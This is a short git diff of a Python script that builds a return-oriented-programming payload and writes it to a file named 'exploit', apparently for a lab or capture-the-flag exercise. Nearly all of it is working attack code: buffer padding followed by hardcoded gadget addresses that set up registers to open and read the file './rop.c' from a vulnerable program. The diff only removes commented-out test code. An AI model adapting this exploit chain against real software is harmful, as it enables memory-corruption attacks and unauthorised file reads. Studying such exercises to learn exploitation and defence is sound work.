@@ -7,23 +7,10 @@ def pack64(n):
 	return s
 
 
-
 f = open("./exploit", "w")
 
 payload = ""
 
-# """
-# To check if overflow works
-# """
-# n = 50 # alw multiples of 10
-# s = "abcd"
-# for i in range (n//10):
-# 	index = i % len(s) # wrap around
-# 	payload += s[index]*10 # clarity
-
-"""
-To feed actual paylod
-"""
 payload += "./rop.c\0" # filename
 payload = payload.ljust(56, "\x00")
 
@@ -40,7 +27,6 @@ payload += pack64(0x00005555555549e3) # pop rdi; ret: fd
 payload += pack64(0x3)
 payload += pack64(0x00007ffff7deb529) # pop rsi; ret
 payload += pack64(0x7fffffffd3e0) # place to read into
-# payload += pack64(0x00)
 payload += pack64(0x00007ffff7ee0371) # pop rdx; pop r12; ret
 payload += pack64(0x1000) # read 4096 bytes
 payload += pack64(0x00) # r12
@@ -58,4 +44,3 @@ payload = payload.ljust(100)
 
 f.write(payload)
 f.close()
-
